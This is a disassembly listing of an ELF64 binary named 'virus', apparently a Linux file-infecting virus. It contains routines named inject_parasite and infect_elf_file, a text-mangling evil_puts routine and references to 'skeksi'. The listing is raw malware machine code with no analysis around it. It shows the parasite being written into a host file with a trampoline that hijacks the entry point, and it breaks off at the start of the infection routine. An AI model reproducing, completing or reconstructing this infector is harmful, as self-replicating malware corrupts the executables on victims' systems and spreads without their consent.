
virus:     file format elf64-x86-64


Disassembly of section .text:

0000000000400241 <_start>:
  400241:	55                   	push   rbp
  400242:	48 89 e5             	mov    rbp,rsp

0000000000400245 <real_start>:
  400245:	54                   	push   rsp
  400246:	55                   	push   rbp
  400247:	50                   	push   rax
  400248:	53                   	push   rbx
  400249:	51                   	push   rcx
  40024a:	52                   	push   rdx
  40024b:	41 50                	push   r8
  40024d:	41 51                	push   r9
  40024f:	41 52                	push   r10
  400251:	41 53                	push   r11
  400253:	41 54                	push   r12
  400255:	41 55                	push   r13
  400257:	41 56                	push   r14
  400259:	41 57                	push   r15
  40025b:	e8 07 1b 00 00       	call   401d67 <do_main>
  400260:	41 5f                	pop    r15
  400262:	41 5e                	pop    r14
  400264:	41 5d                	pop    r13
  400266:	41 5c                	pop    r12
  400268:	41 5b                	pop    r11
  40026a:	41 5a                	pop    r10
  40026c:	41 59                	pop    r9
  40026e:	41 58                	pop    r8
  400270:	5a                   	pop    rdx
  400271:	59                   	pop    rcx
  400272:	5b                   	pop    rbx
  400273:	58                   	pop    rax
  400274:	5d                   	pop    rbp
  400275:	5c                   	pop    rsp
  400276:	48 83 c4 08          	add    rsp,0x8
  40027a:	e9 0f 2b 00 00       	jmp    402d8e <end_code>
  40027f:	90                   	nop
  400280:	5d                   	pop    rbp
  400281:	c3                   	ret    

0000000000400282 <evil_puts>:
  400282:	55                   	push   rbp
  400283:	48 89 e5             	mov    rbp,rsp
  400286:	48 81 ec 40 04 00 00 	sub    rsp,0x440
  40028d:	48 89 bd c8 fb ff ff 	mov    QWORD PTR [rbp-0x438],rdi
  400294:	48 8b 85 c8 fb ff ff 	mov    rax,QWORD PTR [rbp-0x438]
  40029b:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  40029f:	c7 45 f4 00 00 00 00 	mov    DWORD PTR [rbp-0xc],0x0
  4002a6:	c7 45 ec 05 00 00 00 	mov    DWORD PTR [rbp-0x14],0x5
  4002ad:	48 8d 85 d0 fb ff ff 	lea    rax,[rbp-0x430]
  4002b4:	be 00 00 00 00       	mov    esi,0x0
  4002b9:	48 89 c7             	mov    rdi,rax
  4002bc:	e8 8b 21 00 00       	call   40244c <_gettimeofday>
  4002c1:	48 8d 85 d0 fb ff ff 	lea    rax,[rbp-0x430]
  4002c8:	48 83 c0 08          	add    rax,0x8
  4002cc:	48 89 c7             	mov    rdi,rax
  4002cf:	e8 dc 01 00 00       	call   4004b0 <_rand>
  4002d4:	99                   	cdq    
  4002d5:	f7 7d ec             	idiv   DWORD PTR [rbp-0x14]
  4002d8:	89 d0                	mov    eax,edx
  4002da:	89 45 f0             	mov    DWORD PTR [rbp-0x10],eax
  4002dd:	83 7d f0 03          	cmp    DWORD PTR [rbp-0x10],0x3
  4002e1:	0f 85 2a 01 00 00    	jne    400411 <evil_puts+0x18f>
  4002e7:	48 8d 85 e0 fb ff ff 	lea    rax,[rbp-0x420]
  4002ee:	ba 00 04 00 00       	mov    edx,0x400
  4002f3:	be 00 00 00 00       	mov    esi,0x0
  4002f8:	48 89 c7             	mov    rdi,rax
  4002fb:	e8 c4 21 00 00       	call   4024c4 <Memset>
  400300:	e9 e3 00 00 00       	jmp    4003e8 <evil_puts+0x166>
  400305:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400309:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  40030c:	0f be c0             	movsx  eax,al
  40030f:	89 c7                	mov    edi,eax
  400311:	e8 12 29 00 00       	call   402c28 <_toupper>
  400316:	0f be c0             	movsx  eax,al
  400319:	83 e8 41             	sub    eax,0x41
  40031c:	83 f8 13             	cmp    eax,0x13
  40031f:	0f 87 a4 00 00 00    	ja     4003c9 <evil_puts+0x147>
  400325:	89 c0                	mov    eax,eax
  400327:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
  40032e:	00 
  40032f:	48 8d 05 aa 2a 00 00 	lea    rax,[rip+0x2aaa]        # 402de0 <display_skeksi+0x39>
  400336:	8b 04 02             	mov    eax,DWORD PTR [rdx+rax*1]
  400339:	48 63 d0             	movsxd rdx,eax
  40033c:	48 8d 05 9d 2a 00 00 	lea    rax,[rip+0x2a9d]        # 402de0 <display_skeksi+0x39>
  400343:	48 01 d0             	add    rax,rdx
  400346:	ff e0                	jmp    rax
  400348:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  40034b:	8d 50 01             	lea    edx,[rax+0x1]
  40034e:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  400351:	48 98                	cdqe   
  400353:	c6 84 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],0x31
  40035a:	31 
  40035b:	e9 83 00 00 00       	jmp    4003e3 <evil_puts+0x161>
  400360:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  400363:	8d 50 01             	lea    edx,[rax+0x1]
  400366:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  400369:	48 98                	cdqe   
  40036b:	c6 84 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],0x33
  400372:	33 
  400373:	eb 6e                	jmp    4003e3 <evil_puts+0x161>
  400375:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  400378:	8d 50 01             	lea    edx,[rax+0x1]
  40037b:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  40037e:	48 98                	cdqe   
  400380:	c6 84 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],0x35
  400387:	35 
  400388:	eb 59                	jmp    4003e3 <evil_puts+0x161>
  40038a:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  40038d:	8d 50 01             	lea    edx,[rax+0x1]
  400390:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  400393:	48 98                	cdqe   
  400395:	c6 84 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],0x37
  40039c:	37 
  40039d:	eb 44                	jmp    4003e3 <evil_puts+0x161>
  40039f:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  4003a2:	8d 50 01             	lea    edx,[rax+0x1]
  4003a5:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  4003a8:	48 98                	cdqe   
  4003aa:	c6 84 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],0x30
  4003b1:	30 
  4003b2:	eb 2f                	jmp    4003e3 <evil_puts+0x161>
  4003b4:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  4003b7:	8d 50 01             	lea    edx,[rax+0x1]
  4003ba:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  4003bd:	48 98                	cdqe   
  4003bf:	c6 84 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],0x34
  4003c6:	34 
  4003c7:	eb 1a                	jmp    4003e3 <evil_puts+0x161>
  4003c9:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  4003cc:	8d 50 01             	lea    edx,[rax+0x1]
  4003cf:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  4003d2:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
  4003d6:	0f b6 12             	movzx  edx,BYTE PTR [rdx]
  4003d9:	48 98                	cdqe   
  4003db:	88 94 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],dl
  4003e2:	90                   	nop
  4003e3:	48 83 45 f8 01       	add    QWORD PTR [rbp-0x8],0x1
  4003e8:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4003ec:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  4003ef:	84 c0                	test   al,al
  4003f1:	74 0d                	je     400400 <evil_puts+0x17e>
  4003f3:	81 7d f4 ff 03 00 00 	cmp    DWORD PTR [rbp-0xc],0x3ff
  4003fa:	0f 8e 05 ff ff ff    	jle    400305 <evil_puts+0x83>
  400400:	48 8d 85 e0 fb ff ff 	lea    rax,[rbp-0x420]
  400407:	48 89 c7             	mov    rdi,rax
  40040a:	e8 97 27 00 00       	call   402ba6 <_puts_nl>
  40040f:	eb 10                	jmp    400421 <evil_puts+0x19f>
  400411:	90                   	nop
  400412:	48 8b 85 c8 fb ff ff 	mov    rax,QWORD PTR [rbp-0x438]
  400419:	48 89 c7             	mov    rdi,rax
  40041c:	e8 85 27 00 00       	call   402ba6 <_puts_nl>
  400421:	c9                   	leave  
  400422:	c3                   	ret    

0000000000400423 <vx_malloc>:
  400423:	55                   	push   rbp
  400424:	48 89 e5             	mov    rbp,rsp
  400427:	48 83 ec 10          	sub    rsp,0x10
  40042b:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  40042f:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi
  400433:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  400437:	48 8b 00             	mov    rax,QWORD PTR [rax]
  40043a:	48 85 c0             	test   rax,rax
  40043d:	75 49                	jne    400488 <vx_malloc+0x65>
  40043f:	41 b9 00 00 00 00    	mov    r9d,0x0
  400445:	49 c7 c0 ff ff ff ff 	mov    r8,0xffffffffffffffff
  40044c:	b9 22 00 00 00       	mov    ecx,0x22
  400451:	ba 03 00 00 00       	mov    edx,0x3
  400456:	be 00 00 20 00       	mov    esi,0x200000
  40045b:	bf 00 00 00 00       	mov    edi,0x0
  400460:	e8 82 1e 00 00       	call   4022e7 <_mmap>
  400465:	48 89 c2             	mov    rdx,rax
  400468:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  40046c:	48 89 10             	mov    QWORD PTR [rax],rdx
  40046f:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  400473:	48 8b 00             	mov    rax,QWORD PTR [rax]
  400476:	48 83 f8 ff          	cmp    rax,0xffffffffffffffff
  40047a:	75 0c                	jne    400488 <vx_malloc+0x65>
  40047c:	48 c7 c7 ff ff ff ff 	mov    rdi,0xffffffffffffffff
  400483:	e8 cc 1c 00 00       	call   402154 <Exit>
  400488:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  40048c:	48 8b 00             	mov    rax,QWORD PTR [rax]
  40048f:	48 8d 90 00 01 00 00 	lea    rdx,[rax+0x100]
  400496:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  40049a:	48 89 10             	mov    QWORD PTR [rax],rdx
  40049d:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  4004a1:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4004a4:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
  4004a8:	48 f7 da             	neg    rdx
  4004ab:	48 01 d0             	add    rax,rdx
  4004ae:	c9                   	leave  
  4004af:	c3                   	ret    

00000000004004b0 <_rand>:
  4004b0:	55                   	push   rbp
  4004b1:	48 89 e5             	mov    rbp,rsp
  4004b4:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  4004b8:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4004bc:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4004bf:	48 69 c0 6d 4e c6 41 	imul   rax,rax,0x41c64e6d
  4004c6:	48 8d 90 39 30 00 00 	lea    rdx,[rax+0x3039]
  4004cd:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4004d1:	48 89 10             	mov    QWORD PTR [rax],rdx
  4004d4:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4004d8:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4004db:	48 8d 90 ff ff 00 00 	lea    rdx,[rax+0xffff]
  4004e2:	48 85 c0             	test   rax,rax
  4004e5:	48 0f 48 c2          	cmovs  rax,rdx
  4004e9:	48 c1 f8 10          	sar    rax,0x10
  4004ed:	25 ff 7f 00 00       	and    eax,0x7fff
  4004f2:	5d                   	pop    rbp
  4004f3:	c3                   	ret    

00000000004004f4 <randomly_select_dir>:
  4004f4:	55                   	push   rbp
  4004f5:	48 89 e5             	mov    rbp,rsp
  4004f8:	48 83 ec 30          	sub    rsp,0x30
  4004fc:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  400500:	c7 45 fc 04 00 00 00 	mov    DWORD PTR [rbp-0x4],0x4
  400507:	48 8d 45 e0          	lea    rax,[rbp-0x20]
  40050b:	be 00 00 00 00       	mov    esi,0x0
  400510:	48 89 c7             	mov    rdi,rax
  400513:	e8 34 1f 00 00       	call   40244c <_gettimeofday>
  400518:	48 8d 45 e0          	lea    rax,[rbp-0x20]
  40051c:	48 83 c0 08          	add    rax,0x8
  400520:	48 89 c7             	mov    rdi,rax
  400523:	e8 88 ff ff ff       	call   4004b0 <_rand>
  400528:	99                   	cdq    
  400529:	f7 7d fc             	idiv   DWORD PTR [rbp-0x4]
  40052c:	89 d0                	mov    eax,edx
  40052e:	89 c0                	mov    eax,eax
  400530:	48 8d 14 c5 00 00 00 	lea    rdx,[rax*8+0x0]
  400537:	00 
  400538:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  40053c:	48 01 d0             	add    rax,rdx
  40053f:	48 8b 00             	mov    rax,QWORD PTR [rax]
  400542:	c9                   	leave  
  400543:	c3                   	ret    

0000000000400544 <full_path>:
  400544:	55                   	push   rbp
  400545:	48 89 e5             	mov    rbp,rsp
  400548:	53                   	push   rbx
  400549:	48 83 ec 38          	sub    rsp,0x38
  40054d:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  400551:	48 89 75 d0          	mov    QWORD PTR [rbp-0x30],rsi
  400555:	48 89 55 c8          	mov    QWORD PTR [rbp-0x38],rdx
  400559:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  40055d:	48 89 c7             	mov    rdi,rax
  400560:	e8 94 26 00 00       	call   402bf9 <_strlen>
  400565:	48 89 c3             	mov    rbx,rax
  400568:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  40056c:	48 89 c7             	mov    rdi,rax
  40056f:	e8 85 26 00 00       	call   402bf9 <_strlen>
  400574:	48 01 d8             	add    rax,rbx
  400577:	48 8d 50 02          	lea    rdx,[rax+0x2]
  40057b:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  40057f:	48 89 c6             	mov    rsi,rax
  400582:	48 89 d7             	mov    rdi,rdx
  400585:	e8 99 fe ff ff       	call   400423 <vx_malloc>
  40058a:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  40058e:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400592:	48 89 c7             	mov    rdi,rax
  400595:	e8 5f 26 00 00       	call   402bf9 <_strlen>
  40059a:	89 c3                	mov    ebx,eax
  40059c:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  4005a0:	48 89 c7             	mov    rdi,rax
  4005a3:	e8 51 26 00 00       	call   402bf9 <_strlen>
  4005a8:	8d 14 03             	lea    edx,[rbx+rax*1]
  4005ab:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  4005af:	be 00 00 00 00       	mov    esi,0x0
  4005b4:	48 89 c7             	mov    rdi,rax
  4005b7:	e8 08 1f 00 00       	call   4024c4 <Memset>
  4005bc:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  4005c0:	48 89 c7             	mov    rdi,rax
  4005c3:	e8 31 26 00 00       	call   402bf9 <_strlen>
  4005c8:	89 c2                	mov    edx,eax
  4005ca:	48 8b 4d d0          	mov    rcx,QWORD PTR [rbp-0x30]
  4005ce:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  4005d2:	48 89 ce             	mov    rsi,rcx
  4005d5:	48 89 c7             	mov    rdi,rax
  4005d8:	e8 99 1e 00 00       	call   402476 <_memcpy>
  4005dd:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  4005e1:	48 89 c7             	mov    rdi,rax
  4005e4:	e8 10 26 00 00       	call   402bf9 <_strlen>
  4005e9:	48 89 c2             	mov    rdx,rax
  4005ec:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  4005f0:	48 01 d0             	add    rax,rdx
  4005f3:	c6 00 2f             	mov    BYTE PTR [rax],0x2f
  4005f6:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4005fa:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  4005fd:	3c 2e                	cmp    al,0x2e
  4005ff:	75 14                	jne    400615 <full_path+0xd1>
  400601:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400605:	48 83 c0 01          	add    rax,0x1
  400609:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  40060c:	3c 2f                	cmp    al,0x2f
  40060e:	75 05                	jne    400615 <full_path+0xd1>
  400610:	48 83 45 d8 02       	add    QWORD PTR [rbp-0x28],0x2
  400615:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400619:	48 89 c7             	mov    rdi,rax
  40061c:	e8 d8 25 00 00       	call   402bf9 <_strlen>
  400621:	89 c3                	mov    ebx,eax
  400623:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  400627:	48 89 c7             	mov    rdi,rax
  40062a:	e8 ca 25 00 00       	call   402bf9 <_strlen>
  40062f:	48 8d 50 01          	lea    rdx,[rax+0x1]
  400633:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  400637:	48 8d 0c 02          	lea    rcx,[rdx+rax*1]
  40063b:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  40063f:	89 da                	mov    edx,ebx
  400641:	48 89 c6             	mov    rsi,rax
  400644:	48 89 cf             	mov    rdi,rcx
  400647:	e8 2a 1e 00 00       	call   402476 <_memcpy>
  40064c:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  400650:	48 83 c4 38          	add    rsp,0x38
  400654:	5b                   	pop    rbx
  400655:	5d                   	pop    rbp
  400656:	c3                   	ret    

0000000000400657 <inject_parasite>:
  400657:	55                   	push   rbp
  400658:	48 89 e5             	mov    rbp,rsp
  40065b:	48 81 ec 30 01 00 00 	sub    rsp,0x130
  400662:	48 89 bd f8 fe ff ff 	mov    QWORD PTR [rbp-0x108],rdi
  400669:	48 89 b5 f0 fe ff ff 	mov    QWORD PTR [rbp-0x110],rsi
  400670:	48 89 95 e8 fe ff ff 	mov    QWORD PTR [rbp-0x118],rdx
  400677:	48 89 8d e0 fe ff ff 	mov    QWORD PTR [rbp-0x120],rcx
  40067e:	4c 89 85 d8 fe ff ff 	mov    QWORD PTR [rbp-0x128],r8
  400685:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  40068c:	c7 45 f8 40 00 00 00 	mov    DWORD PTR [rbp-0x8],0x40
  400693:	48 8b 85 e8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x118]
  40069a:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  40069e:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  4006a2:	48 8b 85 e0 fe ff ff 	mov    rax,QWORD PTR [rbp-0x120]
  4006a9:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  4006ad:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  4006b1:	48 8b 85 e8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x118]
  4006b8:	48 8b 40 60          	mov    rax,QWORD PTR [rax+0x60]
  4006bc:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  4006c0:	48 8b 85 e8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x118]
  4006c7:	48 8d 48 68          	lea    rcx,[rax+0x68]
  4006cb:	48 8d 85 10 ff ff ff 	lea    rax,[rbp-0xf0]
  4006d2:	ba 90 00 00 00       	mov    edx,0x90
  4006d7:	48 89 ce             	mov    rsi,rcx
  4006da:	48 89 c7             	mov    rdi,rax
  4006dd:	e8 94 1d 00 00       	call   402476 <_memcpy>
  4006e2:	8b 85 28 ff ff ff    	mov    eax,DWORD PTR [rbp-0xd8]
  4006e8:	89 c0                	mov    eax,eax
  4006ea:	48 89 c2             	mov    rdx,rax
  4006ed:	be 41 02 00 00       	mov    esi,0x241
  4006f2:	48 8d 3d 37 27 00 00 	lea    rdi,[rip+0x2737]        # 402e30 <display_skeksi+0x89>
  4006f9:	e8 71 1a 00 00       	call   40216f <_open>
  4006fe:	89 45 dc             	mov    DWORD PTR [rbp-0x24],eax
  400701:	83 7d dc ff          	cmp    DWORD PTR [rbp-0x24],0xffffffff
  400705:	75 0a                	jne    400711 <inject_parasite+0xba>
  400707:	b8 ff ff ff ff       	mov    eax,0xffffffff
  40070c:	e9 fb 01 00 00       	jmp    40090c <inject_parasite+0x2b5>
  400711:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400714:	48 63 d0             	movsxd rdx,eax
  400717:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  40071a:	48 98                	cdqe   
  40071c:	48 8b 4d f0          	mov    rcx,QWORD PTR [rbp-0x10]
  400720:	48 89 ce             	mov    rsi,rcx
  400723:	48 89 c7             	mov    rdi,rax
  400726:	e8 c2 1a 00 00       	call   4021ed <_write>
  40072b:	89 45 d8             	mov    DWORD PTR [rbp-0x28],eax
  40072e:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400731:	39 45 d8             	cmp    DWORD PTR [rbp-0x28],eax
  400734:	74 0a                	je     400740 <inject_parasite+0xe9>
  400736:	b8 ff ff ff ff       	mov    eax,0xffffffff
  40073b:	e9 cc 01 00 00       	jmp    40090c <inject_parasite+0x2b5>
  400740:	e8 32 26 00 00       	call   402d77 <get_rip>
  400745:	48 89 c2             	mov    rdx,rax
  400748:	48 8d 05 3f 26 00 00 	lea    rax,[rip+0x263f]        # 402d8e <end_code>
  40074f:	48 01 c2             	add    rdx,rax
  400752:	48 8d 05 27 26 00 00 	lea    rax,[rip+0x2627]        # 402d80 <get_rip_label>
  400759:	48 29 c2             	sub    rdx,rax
  40075c:	48 89 d0             	mov    rax,rdx
  40075f:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  400763:	e8 0f 26 00 00       	call   402d77 <get_rip>
  400768:	48 89 c2             	mov    rdx,rax
  40076b:	48 8d 05 2d 26 00 00 	lea    rax,[rip+0x262d]        # 402d9f <dummy_marker>
  400772:	48 01 c2             	add    rdx,rax
  400775:	48 8d 05 04 26 00 00 	lea    rax,[rip+0x2604]        # 402d80 <get_rip_label>
  40077c:	48 29 c2             	sub    rdx,rax
  40077f:	48 89 d0             	mov    rax,rdx
  400782:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
  400786:	48 8b 55 c8          	mov    rdx,QWORD PTR [rbp-0x38]
  40078a:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  40078e:	48 29 c2             	sub    rdx,rax
  400791:	48 89 d0             	mov    rax,rdx
  400794:	89 45 c4             	mov    DWORD PTR [rbp-0x3c],eax
  400797:	e8 db 25 00 00       	call   402d77 <get_rip>
  40079c:	48 89 c2             	mov    rdx,rax
  40079f:	48 8d 05 e8 25 00 00 	lea    rax,[rip+0x25e8]        # 402d8e <end_code>
  4007a6:	48 01 c2             	add    rdx,rax
  4007a9:	48 8d 05 d0 25 00 00 	lea    rax,[rip+0x25d0]        # 402d80 <get_rip_label>
  4007b0:	48 29 c2             	sub    rdx,rax
  4007b3:	48 89 d0             	mov    rax,rdx
  4007b6:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
  4007ba:	c6 85 0a ff ff ff 68 	mov    BYTE PTR [rbp-0xf6],0x68
  4007c1:	c6 85 0b ff ff ff 00 	mov    BYTE PTR [rbp-0xf5],0x0
  4007c8:	c6 85 0c ff ff ff 00 	mov    BYTE PTR [rbp-0xf4],0x0
  4007cf:	c6 85 0d ff ff ff 00 	mov    BYTE PTR [rbp-0xf3],0x0
  4007d6:	c6 85 0e ff ff ff 00 	mov    BYTE PTR [rbp-0xf2],0x0
  4007dd:	c6 85 0f ff ff ff c3 	mov    BYTE PTR [rbp-0xf1],0xc3
  4007e4:	48 8d 85 0a ff ff ff 	lea    rax,[rbp-0xf6]
  4007eb:	48 83 c0 01          	add    rax,0x1
  4007ef:	48 8b 95 d8 fe ff ff 	mov    rdx,QWORD PTR [rbp-0x128]
  4007f6:	89 10                	mov    DWORD PTR [rax],edx
  4007f8:	48 8b 85 e0 fe ff ff 	mov    rax,QWORD PTR [rbp-0x120]
  4007ff:	48 8b 40 58          	mov    rax,QWORD PTR [rax+0x58]
  400803:	48 2d 68 42 00 00    	sub    rax,0x4268
  400809:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
  40080d:	8b 45 c4             	mov    eax,DWORD PTR [rbp-0x3c]
  400810:	48 98                	cdqe   
  400812:	48 29 45 b0          	sub    QWORD PTR [rbp-0x50],rax
  400816:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  400819:	48 98                	cdqe   
  40081b:	48 8b 55 b0          	mov    rdx,QWORD PTR [rbp-0x50]
  40081f:	48 8b 4d e8          	mov    rcx,QWORD PTR [rbp-0x18]
  400823:	48 89 ce             	mov    rsi,rcx
  400826:	48 89 c7             	mov    rdi,rax
  400829:	e8 bf 19 00 00       	call   4021ed <_write>
  40082e:	89 45 d8             	mov    DWORD PTR [rbp-0x28],eax
  400831:	8b 45 d8             	mov    eax,DWORD PTR [rbp-0x28]
  400834:	48 39 45 b0          	cmp    QWORD PTR [rbp-0x50],rax
  400838:	74 0a                	je     400844 <inject_parasite+0x1ed>
  40083a:	b8 ff ff ff ff       	mov    eax,0xffffffff
  40083f:	e9 c8 00 00 00       	jmp    40090c <inject_parasite+0x2b5>
  400844:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  400847:	48 98                	cdqe   
  400849:	48 8d 8d 0a ff ff ff 	lea    rcx,[rbp-0xf6]
  400850:	ba 06 00 00 00       	mov    edx,0x6
  400855:	48 89 ce             	mov    rsi,rcx
  400858:	48 89 c7             	mov    rdi,rax
  40085b:	e8 8d 19 00 00       	call   4021ed <_write>
  400860:	8b 45 c4             	mov    eax,DWORD PTR [rbp-0x3c]
  400863:	48 98                	cdqe   
  400865:	48 8d 90 62 42 00 00 	lea    rdx,[rax+0x4262]
  40086c:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400870:	48 8d 48 06          	lea    rcx,[rax+0x6]
  400874:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  400878:	48 01 c1             	add    rcx,rax
  40087b:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  40087e:	48 98                	cdqe   
  400880:	48 89 ce             	mov    rsi,rcx
  400883:	48 89 c7             	mov    rdi,rax
  400886:	e8 62 19 00 00       	call   4021ed <_write>
  40088b:	48 8b 85 f0 fe ff ff 	mov    rax,QWORD PTR [rbp-0x110]
  400892:	83 c0 40             	add    eax,0x40
  400895:	89 45 ac             	mov    DWORD PTR [rbp-0x54],eax
  400898:	8b 4d ac             	mov    ecx,DWORD PTR [rbp-0x54]
  40089b:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  40089e:	48 98                	cdqe   
  4008a0:	ba 00 00 00 00       	mov    edx,0x0
  4008a5:	48 89 ce             	mov    rsi,rcx
  4008a8:	48 89 c7             	mov    rdi,rax
  4008ab:	e8 e5 19 00 00       	call   402295 <_lseek>
  4008b0:	89 45 d8             	mov    DWORD PTR [rbp-0x28],eax
  4008b3:	8b 45 d8             	mov    eax,DWORD PTR [rbp-0x28]
  4008b6:	3b 45 ac             	cmp    eax,DWORD PTR [rbp-0x54]
  4008b9:	74 07                	je     4008c2 <inject_parasite+0x26b>
  4008bb:	b8 ff ff ff ff       	mov    eax,0xffffffff
  4008c0:	eb 4a                	jmp    40090c <inject_parasite+0x2b5>
  4008c2:	48 83 45 f0 40       	add    QWORD PTR [rbp-0x10],0x40
  4008c7:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4008ce:	83 e8 40             	sub    eax,0x40
  4008d1:	89 45 a8             	mov    DWORD PTR [rbp-0x58],eax
  4008d4:	8b 55 a8             	mov    edx,DWORD PTR [rbp-0x58]
  4008d7:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  4008da:	48 98                	cdqe   
  4008dc:	48 8b 4d f0          	mov    rcx,QWORD PTR [rbp-0x10]
  4008e0:	48 89 ce             	mov    rsi,rcx
  4008e3:	48 89 c7             	mov    rdi,rax
  4008e6:	e8 02 19 00 00       	call   4021ed <_write>
  4008eb:	89 45 d8             	mov    DWORD PTR [rbp-0x28],eax
  4008ee:	8b 45 d8             	mov    eax,DWORD PTR [rbp-0x28]
  4008f1:	3b 45 a8             	cmp    eax,DWORD PTR [rbp-0x58]
  4008f4:	74 07                	je     4008fd <inject_parasite+0x2a6>
  4008f6:	b8 ff ff ff ff       	mov    eax,0xffffffff
  4008fb:	eb 0f                	jmp    40090c <inject_parasite+0x2b5>
  4008fd:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  400900:	89 c7                	mov    edi,eax
  400902:	e8 9a 18 00 00       	call   4021a1 <_close>
  400907:	b8 00 00 00 00       	mov    eax,0x0
  40090c:	c9                   	leave  
  40090d:	c3                   	ret    

000000000040090e <infect_elf_file>:
  40090e:	55                   	push   rbp
  40090f:	48 89 e5             	mov    rbp,rsp
  400912:	48 81 ec 00 01 00 00 	sub    rsp,0x100
  400919:	48 89 bd 08 ff ff ff 	mov    QWORD PTR [rbp-0xf8],rdi
  400920:	48 89 b5 00 ff ff ff 	mov    QWORD PTR [rbp-0x100],rsi
